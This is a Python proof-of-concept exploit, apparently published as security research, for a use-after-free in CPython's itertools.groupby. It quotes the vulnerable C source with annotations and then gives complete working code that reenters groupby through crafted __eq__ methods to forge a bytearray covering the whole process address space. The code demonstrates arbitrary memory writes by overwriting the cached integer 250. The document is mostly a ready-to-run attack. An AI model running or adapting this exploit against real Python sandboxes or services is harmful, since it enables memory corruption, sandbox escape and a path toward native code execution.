"""
Author: @chilaxan
Bug Credits: @Nico-Posada
"""

# TLDR: UAF on a controlled object to create evil bytearray object
# Tested to work on 3.13.0, 3.13.1, 3.14.0

# Here is the vulnerable code as of 3.14.0
# https://github.com/python/cpython/blob/v3.14.0/Modules/itertoolsmodule.c#L507-L569
"""
Py_LOCAL_INLINE(int)
groupby_step(groupbyobject *gbo)
{
    PyObject *newvalue, *newkey, *oldvalue;

    newvalue = PyIter_Next(gbo->it);
    if (newvalue == NULL)
        return -1;

    if (gbo->keyfunc == Py_None) {
        newkey = Py_NewRef(newvalue);
    } else {
        newkey = PyObject_CallOneArg(gbo->keyfunc, newvalue);
        if (newkey == NULL) {
            Py_DECREF(newvalue);
            return -1;
        }
    }

    oldvalue = gbo->currvalue;
    gbo->currvalue = newvalue;
    Py_XSETREF(gbo->currkey, newkey); // <--- overwrites gbo->currkey (XSETREF decrefs the old value before setting)
    Py_XDECREF(oldvalue);
    return 0;
}

static PyObject *
groupby_next(PyObject *op)
{
    PyObject *r, *grouper;
    groupbyobject *gbo = groupbyobject_CAST(op);

    gbo->currgrouper = NULL;
    /* skip to next iteration group */
    for (;;) {
        if (gbo->currkey == NULL)
            /* pass */;
        else if (gbo->tgtkey == NULL)
            break;
        else {
            int rcmp;

            rcmp = PyObject_RichCompareBool(gbo->tgtkey, gbo->currkey, Py_EQ); // <--- calls controlled function without incref'ing either value
            if (rcmp == -1)
                return NULL;
            else if (rcmp == 0)
                break;
        }

        if (groupby_step(gbo) < 0) // <--- grouby_step here (used to overwrite gbo->currkey)
            return NULL;
    }
    Py_INCREF(gbo->currkey);
    Py_XSETREF(gbo->tgtkey, gbo->currkey);

    grouper = _grouper_create(gbo, gbo->tgtkey);
    if (grouper == NULL)
        return NULL;

    r = PyTuple_Pack(2, gbo->currkey, grouper);
    Py_DECREF(grouper);
    return r;
}
"""

# The attack strategy here is to get into the __eq__ call, then reenter the function again to overwrite gbo->currkey. Once back in the
# original call, we can return NotImplemented to receive the deleted gbo->currkey value in Evil.__eq__ on the second run.

from itertools import groupby

class Lamb(bytearray):
    __slots__ = ()
    called = False
    def __eq__(self, other):
        if Lamb.called:
            return NotImplemented
        Lamb.called = True
        next(gbo)
        return NotImplemented

class Evil:
    __slots__ = ()
    called = False
    def __eq__(self, other):
        if Evil.called:
            # add GC header, subclasses *always* are part of the GC
            backing = memoryview(bytearray(Lamb.__basicsize__ + tuple.__itemsize__ * 2)).cast('P')
            backing[2] = 0xdeadbeef
            backing[3] = id(bytearray)
            backing[4] = (2 ** (tuple.__itemsize__ * 8) - 1) // 2
            raise Exception(backing, other)
        Evil.called = True

def keyfunc():
    yield Lamb()
    while True:
        yield Evil()

gbo = groupby([None, 1], keyfunc().send)

try:
    next(gbo)
    next(gbo)
except Exception as e:
    backing, mem = e.args

print(type(mem))
print(hex(len(mem)))

mem[id(250) + int.__basicsize__] = 100
print(250) # => 100